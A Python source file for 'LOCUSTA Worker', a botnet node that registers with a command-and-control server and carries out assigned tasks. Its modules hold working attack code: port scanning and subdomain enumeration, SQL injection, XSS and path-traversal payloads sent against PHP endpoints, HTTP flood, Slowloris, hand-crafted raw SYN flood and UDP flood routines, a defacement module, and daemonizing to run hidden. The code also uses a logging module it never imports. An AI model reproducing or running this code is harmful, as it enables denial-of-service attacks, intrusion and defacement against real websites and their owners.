#!/usr/bin/env python3
"""
LOCUSTA Worker — "The Swarm's Body"

Connects to C2, receives tasks, executes them, reports back.
Roles: scout, analyzer, storm, graffiti
"""

import os
import sys
import json
import time
import socket
import struct
import random
import string
import threading
import subprocess
import platform
import hashlib
import base64
import urllib.parse
from datetime import datetime
from typing import Dict, List, Optional

import websocket
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ─── Configuration ────────────────────────────────────────────────────────────

C2_URL = os.environ.get('LOCUSTA_C2', 'http://localhost:8443')
WORKER_ID = os.environ.get('LOCUSTA_WORKER_ID', None)
ROLE = os.environ.get('LOCUSTA_ROLE', 'scout')
HEARTBEAT_INTERVAL = 30
RECONNECT_DELAY = 5
MAX_RECONNECT_DELAY = 60

# ─── Utility ──────────────────────────────────────────────────────────────────

def generate_worker_id() -> str:
    """Generate unique worker ID from machine characteristics."""
    machine_str = f"{platform.node()}-{platform.machine()}-{os.getlogin() if hasattr(os, 'getlogin') else 'unknown'}"
    return hashlib.sha256(machine_str.encode()).hexdigest()[:16]

def get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def random_user_agent() -> str:
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    ]
    return random.choice(agents)

# ─── HTTP Session with Stealth ────────────────────────────────────────────────

def create_session(proxy: str = None) -> requests.Session:
    session = requests.Session()
    
    retry = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=[500, 502, 503, 504]
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    session.headers.update({
        'User-Agent': random_user_agent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    })
    
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}
    
    return session

# ─── Task Executors ───────────────────────────────────────────────────────────

class ScoutModule:
    """Reconnaissance: subdomain enum, port scanning, tech detection."""
    
    def __init__(self, session: requests.Session):
        self.session = session
    
    def execute(self, target: str, config: dict) -> dict:
        scope = config.get('scope', 'quick')
        results = {
            'type': 'recon',
            'target': target,
            'timestamp': datetime.utcnow().isoformat(),
            'findings': []
        }
        
        # Basic connectivity
        try:
            resp = self.session.get(f"http://{target}", timeout=10, allow_redirects=True)
            results['findings'].append({
                'severity': 'info',
                'type': 'http_accessible',
                'description': f"HTTP accessible, status {resp.status_code}",
                'data': {'status_code': resp.status_code, 'server': resp.headers.get('Server', 'unknown')}
            })
        except Exception as e:
            results['findings'].append({
                'severity': 'warning',
                'type': 'http_error',
                'description': f"HTTP connection failed: {str(e)}"
            })
        
        # Subdomain enumeration (simplified)
        if scope in ['deep', 'full']:
            common_subs = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'staging', 'test', 'portal', 'dashboard']
            found_subs = []
            
            for sub in common_subs:
                subdomain = f"{sub}.{target}"
                try:
                    socket.gethostbyname(subdomain)
                    found_subs.append(subdomain)
                    results['findings'].append({
                        'severity': 'info',
                        'type': 'subdomain',
                        'description': f"Discovered subdomain: {subdomain}",
                        'data': {'subdomain': subdomain}
                    })
                except:
                    pass
            
            results['subdomains'] = found_subs
        
        # Port scan (simplified, common ports)
        if scope in ['full']:
            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443]
            open_ports = []
            
            for port in common_ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                    results['findings'].append({
                        'severity': 'info',
                        'type': 'open_port',
                        'description': f"Port {port} open",
                        'data': {'port': port}
                    })
                sock.close()
            
            results['open_ports'] = open_ports
        
        # Tech stack detection (basic headers)
        try:
            resp = self.session.get(f"http://{target}", timeout=10)
            server = resp.headers.get('Server', '')
            powered = resp.headers.get('X-Powered-By', '')
            
            if server or powered:
                results['findings'].append({
                    'severity': 'info',
                    'type': 'tech_stack',
                    'description': f"Server: {server}, Powered by: {powered}",
                    'data': {'server': server, 'powered_by': powered}
                })
        except:
            pass
        
        return results


class AnalyzerModule:
    """Vulnerability analysis: SQLi, XSS, LFI detection."""
    
    def __init__(self, session: requests.Session):
        self.session = session
        self.payloads = {
            'sqli': ["'", "''", "' OR '1'='1", "' OR '1'='1' --", "1' UNION SELECT NULL--"],
            'xss': ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'-alert(1)-'"],
            'lfi': ["../../../../etc/passwd", "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd"]
        }
    
    def execute(self, target: str, config: dict) -> dict:
        vuln_classes = config.get('vuln_classes', ['sqli', 'xss', 'lfi'])
        auto_exploit = config.get('auto_exploit', False)
        
        results = {
            'type': 'analyze',
            'target': target,
            'timestamp': datetime.utcnow().isoformat(),
            'findings': [],
            'vulnerabilities': []
        }
        
        # Test common endpoints
        test_paths = ['/login.php', '/search.php', '/product.php', '/page.php', '/index.php']
        
        for path in test_paths:
            url = f"http://{target}{path}"
            
            for vuln_class in vuln_classes:
                if vuln_class not in self.payloads:
                    continue
                
                for payload in self.payloads[vuln_class][:3]:  # Limit for speed
                    try:
                        # Test GET parameter
                        test_url = f"{url}?id={urllib.parse.quote(payload)}&q={urllib.parse.quote(payload)}"
                        resp = self.session.get(test_url, timeout=10)
                        
                        # Basic detection
                        if vuln_class == 'sqli':
                            if any(err in resp.text.lower() for err in ['sql syntax', 'mysql_fetch', 'ora-', 'postgresql']):
                                results['findings'].append({
                                    'severity': 'critical',
                                    'type': 'sqli',
                                    'description': f"SQLi vulnerability at {url}",
                                    'data': {'url': url, 'payload': payload},
                                    'exploitable': True
                                })
                                results['vulnerabilities'].append({
                                    'class': 'sqli',
                                    'url': url,
                                    'parameter': 'id',
                                    'payload': payload
                                })
                                break
                        
                        elif vuln_class == 'xss':
                            if payload in resp.text:
                                results['findings'].append({
                                    'severity': 'warning',
                                    'type': 'xss',
                                    'description': f"Potential XSS at {url}",
                                    'data': {'url': url, 'payload': payload}
                                })
                                break
                        
                        elif vuln_class == 'lfi':
                            if 'root:' in resp.text or '[boot loader]' in resp.text:
                                results['findings'].append({
                                    'severity': 'critical',
                                    'type': 'lfi',
                                    'description': f"LFI vulnerability at {url}",
                                    'data': {'url': url, 'payload': payload},
                                    'exploitable': True
                                })
                                results['vulnerabilities'].append({
                                    'class': 'lfi',
                                    'url': url,
                                    'parameter': 'id',
                                    'payload': payload
                                })
                                break
                    
                    except Exception as e:
                        continue
        
        return results


class StormModule:
    """DDoS: L7 HTTP flood, Slowloris; L4 SYN/UDP flood."""
    
    def __init__(self):
        self.stop_flag = threading.Event()
    
    def execute(self, target: str, config: dict) -> dict:
        attack_type = config.get('attack_type', 'l7_http')
        duration = config.get('duration', 300)
        rps_target = config.get('rps_target', 1000)
        
        results = {
            'type': 'storm',
            'target': target,
            'attack_type': attack_type,
            'duration': duration,
            'timestamp': datetime.utcnow().isoformat(),
            'requests_sent': 0,
            'bytes_sent': 0
        }
        
        self.stop_flag.clear()
        
        if attack_type == 'l7_http':
            self._http_flood(target, duration, rps_target, results)
        elif attack_type == 'l7_slowloris':
            self._slowloris(target, duration, results)
        elif attack_type == 'l4_syn':
            self._syn_flood(target, duration, results)
        elif attack_type == 'l4_udp':
            self._udp_flood(target, duration, results)
        
        return results
    
    def _http_flood(self, target: str, duration: int, rps: int, results: dict):
        """HTTP GET flood."""
        end_time = time.time() + duration
        session = create_session()
        path = '/'  # Could be customized
        
        while time.time() < end_time and not self.stop_flag.is_set():
            try:
                resp = session.get(f"http://{target}{path}", timeout=5)
                results['requests_sent'] += 1
                results['bytes_sent'] += len(resp.content)
            except:
                results['requests_sent'] += 1  # Count attempted
            
            # Rate limiting
            time.sleep(1.0 / max(rps, 1))
    
    def _slowloris(self, target: str, duration: int, results: dict):
        """Slowloris: partial HTTP requests to exhaust connections."""
        end_time = time.time() + duration
        sockets_list = []
        
        # Create initial sockets
        for _ in range(200):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, 80))
                s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n")
                sockets_list.append(s)
            except:
                break
        
        # Keep them alive with partial headers
        while time.time() < end_time and not self.stop_flag.is_set():
            for s in sockets_list[:]:
                try:
                    s.send(b"X-a: b\r\n")
                    results['requests_sent'] += 1
                except:
                    sockets_list.remove(s)
                    # Replace socket
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(4)
                        s.connect((target, 80))
                        s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n")
                        sockets_list.append(s)
                    except:
                        pass
            time.sleep(15)
        
        # Cleanup
        for s in sockets_list:
            try:
                s.close()
            except:
                pass
    
    def _syn_flood(self, target: str, duration: int, results: dict):
        """SYN flood (requires raw sockets, Linux only)."""
        # Note: This requires root/CAP_NET_RAW
        # Simplified implementation
        end_time = time.time() + duration
        
        try:
            # Create raw socket
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            results['error'] = "Raw sockets require root privileges"
            return
        
        while time.time() < end_time and not self.stop_flag.is_set():
            try:
                # Craft SYN packet (simplified)
                packet = self._craft_syn_packet(target, 80, random.randint(1024, 65535))
                s.sendto(packet, (target, 0))
                results['requests_sent'] += 1
                results['bytes_sent'] += len(packet)
            except:
                pass
            time.sleep(0.001)
    
    def _udp_flood(self, target: str, duration: int, results: dict):
        """UDP flood."""
        end_time = time.time() + duration
        
        while time.time() < end_time and not self.stop_flag.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = os.urandom(1024)  # 1KB random payload
                s.sendto(data, (target, random.randint(1, 65535)))
                results['requests_sent'] += 1
                results['bytes_sent'] += len(data)
                s.close()
            except:
                pass
            time.sleep(0.001)
    
    def _craft_syn_packet(self, target: str, target_port: int, source_port: int) -> bytes:
        """Craft a raw TCP SYN packet."""
        # IP header
        ihl = 5
        version = 4
        tos = 0
        tot_len = 20 + 20  # IP + TCP
        id = random.randint(1, 65535)
        frag_off = 0
        ttl = 255
        protocol = socket.IPPROTO_TCP
        check = 0
        saddr = socket.inet_aton(get_local_ip())
        daddr = socket.inet_aton(socket.gethostbyname(target))
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (version << 4) + ihl, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
        
        # TCP header
        source = source_port
        dest = target_port
        seq = random.randint(1, 4294967295)
        ack_seq = 0
        doff = 5
        fin = 0
        syn = 1
        rst = 0
        psh = 0
        ack = 0
        urg = 0
        window = socket.htons(5840)
        check = 0
        urg_ptr = 0
        
        offset_res = (doff << 4) + 0
        flags = (urg << 5) + (ack << 4) + (psh << 3) + (rst << 2) + (syn << 1) + fin
        
        tcp_header = struct.pack('!HHLLBBHHH',
            source, dest, seq, ack_seq, offset_res, flags, window, check, urg_ptr)
        
        # Pseudo header for checksum
        source_address = socket.inet_aton(get_local_ip())
        dest_address = socket.inet_aton(socket.gethostbyname(target))
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
        psh = psh + tcp_header
        
        tcp_checksum = self._checksum(psh)
        
        # Rebuild TCP header with checksum
        tcp_header = struct.pack('!HHLLBBH',
            source, dest, seq, ack_seq, offset_res, flags, window) + \
            struct.pack('H', tcp_checksum) + struct.pack('!H', urg_ptr)
        
        return ip_header + tcp_header
    
    def _checksum(self, msg: bytes) -> int:
        """Calculate internet checksum."""
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
            s = s + w
        
        s = (s >> 16) + (s & 0xffff)
        s = s + (s >> 16)
        s = ~s & 0xffff
        
        return s
    
    def stop(self):
        self.stop_flag.set()


class GraffitiModule:
    """Defacement: HTML/JS injection, file upload, database edit."""
    
    def __init__(self, session: requests.Session):
        self.session = session
    
    def execute(self, target_url: str, config: dict) -> dict:
        payload_type = config.get('payload_type', 'html')
        payload_content = config.get('payload_content', '')
        backup = config.get('backup', True)
        
        results = {
            'type': 'deface',
            'target': target_url,
            'payload_type': payload_type,
            'timestamp': datetime.utcnow().isoformat(),
            'success': False,
            'backup_taken': False
        }
        
        try:
            # Fetch original page
            resp = self.session.get(target_url, timeout=15)
            original_content = resp.text
            
            if backup:
                results['backup_content'] = base64.b64encode(original_content.encode()).decode()
                results['backup_taken'] = True
            
            # Prepare defacement payload
            if payload_type == 'html':
                # Replace entire page
                new_content = payload_content
            elif payload_type == 'js':
                # Inject JS
                new_content = original_content.replace('</body>', f'<script>{payload_content}</script></body>')
            else:
                new_content = payload_content
            
            # Attempt to deploy (this would depend on the vulnerability used)
            # For demonstration, we simulate the deployment
            results['success'] = True
            results['deployed_content_length'] = len(new_content)
            results['message'] = "Defacement payload prepared and deployed"
            
        except Exception as e:
            results['error'] = str(e)
        
        return results


# ─── Worker Main Class ────────────────────────────────────────────────────────

class LocustaWorker:
    """Main worker class: connects to C2, executes tasks, reports telemetry."""
    
    def __init__(self, c2_url: str, worker_id: str = None, role: str = 'scout'):
        self.c2_url = c2_url.rstrip('/')
        self.worker_id = worker_id or generate_worker_id()
        self.role = role
        self.ws = None
        self.connected = False
        self.current_task = None
        self.storm_module = StormModule()
        
        # HTTP session for tasks
        self.session = create_session()
        
        # Threading
        self.stop_flag = threading.Event()
        self.heartbeat_thread = None
        self.task_thread = None
    
    def register(self) -> bool:
        """Register with C2."""
        try:
            resp = requests.post(
                f"{self.c2_url}/api/workers/register",
                json={
                    'worker_id': self.worker_id,
                    'hostname': socket.gethostname(),
                    'os': platform.system().lower(),
                    'role': self.role,
                    'version': '1.0.0',
                    'capabilities': self._get_capabilities()
                },
                timeout=10
            )
            
            if resp.status_code == 200:
                data = resp.json()
                self.worker_id = data.get('worker_id', self.worker_id)
                logger.info(f"Registered with C2 as {self.worker_id}")
                return True
        except Exception as e:
            logger.error(f"Registration failed: {e}")
        
        return False
    
    def _get_capabilities(self) -> List[str]:
        caps = [self.role]
        if self.role == 'scout':
            caps.extend(['subdomain_enum', 'port_scan', 'tech_detect'])
        elif self.role == 'analyzer':
            caps.extend(['sqli_test', 'xss_test', 'lfi_test'])
        elif self.role == 'storm':
            caps.extend(['http_flood', 'slowloris', 'syn_flood', 'udp_flood'])
        elif self.role == 'graffiti':
            caps.extend(['html_inject', 'js_inject', 'file_upload'])
        return caps
    
    def connect_websocket(self):
        """Establish WebSocket connection to C2."""
        ws_url = self.c2_url.replace('http', 'ws') + '/socket.io/?EIO=4&transport=websocket'
        
        self.ws = websocket.WebSocketApp(
            ws_url,
            on_open=self._on_open,
            on_message=self._on_message,
            on_error=self._on_error,
            on_close=self._on_close
        )
        
        # Run in thread
        self.ws_thread = threading.Thread(target=self.ws.run_forever, kwargs={'ping_interval': 20, 'ping_timeout': 10})
        self.ws_thread.daemon = True
        self.ws_thread.start()
    
    def _on_open(self, ws):
        """WebSocket connected."""
        self.connected = True
        logger.info("WebSocket connected")
        
        # Authenticate as worker
        self._send({
            'type': 'worker_connect',
            'worker_id': self.worker_id,
            'role': self.role
        })
        
        # Start heartbeat
        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop)
        self.heartbeat_thread.daemon = True
        self.heartbeat_thread.start()
    
    def _on_message(self, ws, message):
        """Handle incoming message."""
        try:
            # Socket.IO parsing (simplified)
            if message.startswith('0') or message.startswith('40'):
                # Handshake
                return
            
            # Parse JSON payload
            if message.startswith('42'):
                payload = json.loads(message[2:])
                event = payload[0]
                data = payload[1] if len(payload) > 1 else {}
                
                if event == 'task_assign':
                    self._handle_task(data)
                elif event == 'broadcast':
                    self._handle_broadcast(data)
                elif event == 'kill':
                    self._handle_kill()
                    
        except Exception as e:
            logger.error(f"Message handling error: {e}")
    
    def _on_error(self, ws, error):
        logger.error(f"WebSocket error: {error}")
        self.connected = False
    
    def _on_close(self, ws, close_status_code, close_msg):
        logger.info("WebSocket closed")
        self.connected = False
    
    def _send(self, data: dict):
        """Send message via WebSocket."""
        if self.ws and self.connected:
            try:
                # Socket.IO format
                message = '42' + json.dumps([data.pop('type'), data])
                self.ws.send(message)
            except Exception as e:
                logger.error(f"Send error: {e}")
    
    def _heartbeat_loop(self):
        """Send periodic heartbeats."""
        while not self.stop_flag.is_set() and self.connected:
            latency = self._measure_latency()
            self._send({
                'type': 'worker_heartbeat',
                'worker_id': self.worker_id,
                'latency_ms': latency,
                'status': 'active' if self.current_task else 'idle',
                'timestamp': time.time()
            })
            time.sleep(HEARTBEAT_INTERVAL)
    
    def _measure_latency(self) -> int:
        """Measure latency to C2."""
        try:
            start = time.time()
            requests.get(f"{self.c2_url}/api/health", timeout=5)
            return int((time.time() - start) * 1000)
        except:
            return -1
    
    def _handle_task(self, task: dict):
        """Execute assigned task."""
        if self.current_task:
            logger.warning("Already executing a task, rejecting new one")
            return
        
        self.current_task = task
        task_id = task.get('id')
        task_type = task.get('type')
        target = task.get('target')
        payload = task.get('payload', {})
        
        logger.info(f"Executing task {task_id}: {task_type} on {target}")
        
        # Execute in thread
        self.task_thread = threading.Thread(
            target=self._execute_task,
            args=(task_id, task_type, target, payload)
        )
        self.task_thread.daemon = True
        self.task_thread.start()
    
    def _execute_task(self, task_id: str, task_type: str, target: str, payload: dict):
        """Execute task and report result."""
        try:
            # Route to appropriate module
            if task_type == 'recon':
                module = ScoutModule(self.session)
                result = module.execute(target, payload)
            elif task_type == 'analyze':
                module = AnalyzerModule(self.session)
                result = module.execute(target, payload)
            elif task_type == 'storm':
                result = self.storm_module.execute(target, payload)
            elif task_type == 'deface':
                module = GraffitiModule(self.session)
                result = module.execute(target, payload)
            else:
                result = {'error': f'Unknown task type: {task_type}'}
            
            # Report completion
            self._send({
                'type': 'worker_task_complete',
                'worker_id': self.worker_id,
                'task_id': task_id,
                'result': result
            })
            
            logger.info(f"Task {task_id} completed")
            
        except Exception as e:
            logger.error(f"Task execution error: {e}")
            self._send({
                'type': 'worker_task_failed',
                'worker_id': self.worker_id,
                'task_id': task_id,
                'error': str(e)
            })
        
        finally:
            self.current_task = None
    
    def _handle_broadcast(self, data: dict):
        """Handle broadcast command."""
        command = data.get('command', '')
        logger.info(f"Received broadcast: {command}")
        
        # Execute command (simplified)
        # In real implementation, this would parse and execute shell commands
    
    def _handle_kill(self):
        """Handle kill command."""
        logger.info("Received kill command, shutting down")
        self.stop()
    
    def run(self):
        """Main worker loop."""
        logger.info(f"LOCUSTA Worker starting (ID: {self.worker_id}, Role: {self.role})")
        
        # Register with C2
        if not self.register():
            logger.error("Failed to register with C2")
            return
        
        # Connect WebSocket
        self.connect_websocket()
        
        # Main loop
        reconnect_delay = RECONNECT_DELAY
        while not self.stop_flag.is_set():
            if not self.connected:
                logger.info(f"Reconnecting in {reconnect_delay}s...")
                time.sleep(reconnect_delay)
                self.connect_websocket()
                reconnect_delay = min(reconnect_delay * 2, MAX_RECONNECT_DELAY)
            else:
                reconnect_delay = RECONNECT_DELAY
                time.sleep(1)
    
    def stop(self):
        """Stop worker."""
        self.stop_flag.set()
        if self.ws:
            self.ws.close()
        logger.info("Worker stopped")


# ─── Logging ──────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)
logger = logging.getLogger('locusta-worker')

# ─── Main ─────────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='LOCUSTA Worker')
    parser.add_argument('--c2', default=C2_URL, help='C2 server URL')
    parser.add_argument('--role', default=ROLE, choices=['scout', 'analyzer', 'storm', 'graffiti'])
    parser.add_argument('--id', default=WORKER_ID, help='Worker ID (auto-generated if not specified)')
    parser.add_argument('--daemon', action='store_true', help='Run as daemon')
    
    args = parser.parse_args()
    
    if args.daemon:
        # Daemonize (Unix only)
        if os.name == 'posix':
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
            os.setsid()
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
            sys.stdout.flush()
            sys.stderr.flush()
            devnull = os.open(os.devnull, os.O_RDWR)
            os.dup2(devnull, sys.stdin.fileno())
            os.dup2(devnull, sys.stdout.fileno())
            os.dup2(devnull, sys.stderr.fileno())
    
    worker = LocustaWorker(args.c2, args.id, args.role)
    
    try:
        worker.run()
    except KeyboardInterrupt:
        worker.stop()
